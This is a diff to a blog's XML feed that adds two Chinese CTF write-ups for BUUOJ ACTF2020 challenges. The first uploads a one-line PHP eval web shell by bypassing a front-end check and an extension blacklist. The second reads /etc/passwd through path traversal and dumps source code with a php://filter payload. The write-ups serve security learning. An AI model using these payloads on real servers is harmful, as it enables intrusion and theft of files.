@@ -4,6 +4,64 @@
   
     
     <entry>
+      <title>web-buuoj-[ACTF2020 新生赛]Upload</title>
+      <link href="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/"/>
+      <url>/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h1><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210203751177.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210203829103.png" style="zoom:80%;"><p>可以看到页面存在一个文件上传的表单，大概率考察文件上传。</p><h1 id="二、解题"><a href="#二、解题" class="headerlink" title="二、解题"></a>二、解题</h1><h2 id="2-1-上传yjh-php"><a href="#2-1-上传yjh-php" class="headerlink" title="2.1 上传yjh.php"></a>2.1 上传yjh.php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启抓包：</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210204200426.png" style="zoom:80%;"><p>可以看到弹窗提示只允许上传jpg、png和gif格式的图片文件，但是yakit没抓到包，说明做了前端后缀限制。</p><h2 id="2-2-绕过前端限制"><a href="#2-2-绕过前端限制" class="headerlink" title="2.2 绕过前端限制"></a>2.2 绕过前端限制</h2><p>上传yjh.jpg，然后抓包改成yjh.php</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210204509083.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210204614582.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210204919146.png" style="zoom:80%;"><p>上传成功，路径在<code>uplo4d</code>下。能上传成功说明没有检测文件内容。</p><ul><li>jpg改成php后缀：</li></ul><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205134079.png" style="zoom:80%;"><p>无法上传。但此时Content-Type类型已经是<code>image/jpeg</code>类型了，说明不是MIME类型的问题。</p><p>并且文件后缀是jpg的时候是可以上传的，说明后端并没有检测文件内容。不需要处理文件内容。</p><p>所以推出应该是黑名单检测</p><h2 id="2-3-绕过黑名单"><a href="#2-3-绕过黑名单" class="headerlink" title="2.3 绕过黑名单"></a>2.3 绕过黑名单</h2><p>尝试php5失败。</p><p>尝试phtml成功：</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205716062.png" style="zoom:80%;"><h2 id="2-4-getshell"><a href="#2-4-getshell" class="headerlink" title="2.4 getshell"></a>2.4 getshell</h2><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205825503.png" style="zoom:80%;"><p>蚁剑连接webshell。</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205927678.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-upload/image-20250210205953966.png" style="zoom:80%;"><p>flag：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>03a43cb0-3289-4db5-882b-119718175b29<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本关主要考察文件上传漏洞，涉及的绕过方式主要有前端绕过和后缀名黑名单检测绕过。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF实战 </tag>
+            
+            <tag> web安全 </tag>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>web-buuoj-[ACTF2020 新生赛]Include</title>
+      <link href="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/"/>
+      <url>/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h1><p>题目链接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://buuoj.cn/challenges<span class="token comment">#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210195605175.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210195804015.png" style="zoom:80%;"><p>点击tips：</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210195827028.png" style="zoom:80%;"><p>通过file参数提供一个文件名，猜测可能是考察文件包含漏洞。</p><h1 id="二、漏洞检测"><a href="#二、漏洞检测" class="headerlink" title="二、漏洞检测"></a>二、漏洞检测</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://3961ca17-148a-4df7-9da2-a4ae9c36be4c.node5.buuoj.cn:81/?file<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210200416217.png" style="zoom:80%;"><p>可以看到，成功包含了系统的敏感文件<code>/etc/passwd</code>。</p><h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><p>那么如何获取flag呢？</p><h2 id="3-1-尝试在根目录下找flag"><a href="#3-1-尝试在根目录下找flag" class="headerlink" title="3.1 尝试在根目录下找flag"></a>3.1 尝试在根目录下找flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/?file<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210200647184.png" style="zoom:83%;"><h2 id="3-2-尝试用file-伪协议读取文件"><a href="#3-2-尝试用file-伪协议读取文件" class="headerlink" title="3.2 尝试用file://伪协议读取文件"></a>3.2 尝试用file://伪协议读取文件</h2><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210200801999.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210200834318.png" style="zoom:70%;"><p>​     可能flag不在根目录下。</p><h2 id="3-3-尝试包含当前页的源代码-php-filter"><a href="#3-3-尝试包含当前页的源代码-php-filter" class="headerlink" title="3.3 尝试包含当前页的源代码 php://filter"></a>3.3 尝试包含当前页的源代码 php://filter</h2><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210201117439.png" style="zoom:80%;"><p>返回了一个超大响应，有点不对劲。尝试用<code>php://filter/read</code>读取index.php的源代码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210201445769.png" style="zoom:80%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PG1ldGEgY2hhcnNldD0idXRmOCI+Cjw/cGhwCmVycm9yX3JlcG9ydGluZygwKTsKJGZpbGUgPSAkX0dFVFsiZmlsZSJdOwppZihzdHJpc3RyKCRmaWxlLCJwaHA6Ly9pbnB1dCIpIHx8IHN0cmlzdHIoJGZpbGUsInppcDovLyIpIHx8IHN0cmlzdHIoJGZpbGUsInBoYXI6Ly8iKSB8fCBzdHJpc3RyKCRmaWxlLCJkYXRhOiIpKXsKCWV4aXQoJ2hhY2tlciEnKTsKfQppZigkZmlsZSl7CglpbmNsdWRlKCRmaWxlKTsKfWVsc2V7CgllY2hvICc8YSBocmVmPSI/ZmlsZT1mbGFnLnBocCI+dGlwczwvYT4nOwp9Cj8+Cg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解码之后：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"zip://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phar://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析代码，发现ban掉了php://input、zip://、phar://和data伪协议。</p><p>但是还是没找到flag。</p><p>那再看一下flag.php</p><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210201830878.png" style="zoom:80%;"><img src="/2025/02/11/ctf-shi-zhan/web-buuoj-actf2020-xin-sheng-sai-include/image-20250210201806597.png" style="zoom:80%;"><p>解码之后可以看到flag藏在flag.php的注释中。</p><h2 id="3-4-flag"><a href="#3-4-flag" class="headerlink" title="3.4 flag"></a>3.4 flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>769181eb-6984-411b-85bc-5ad97bf5093c<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这一关的核心点是通过<code>php://filter</code>伪协议读取后端的源代码，核心payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF实战 </tag>
+            
+            <tag> 文件包含 </tag>
+            
+            <tag> web安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>命令执行漏洞</title>
       <link href="/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/"/>
       <url>/2025/02/11/web-an-quan/ming-ling-zhi-xing-lou-dong/</url>
@@ -200,11 +258,11 @@
       
         <tags>
             
+            <tag> 文件包含 </tag>
+            
             <tag> web安全 </tag>
             
             <tag> 漏洞知识库 </tag>
-            
-            <tag> 文件包含 </tag>
             
         </tags>
       
@@ -318,9 +376,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 文件上传漏洞 </tag>
-            
             <tag> 二次渲染绕过 </tag>
+            
+            <tag> 文件上传漏洞 </tag>
             
         </tags>
       
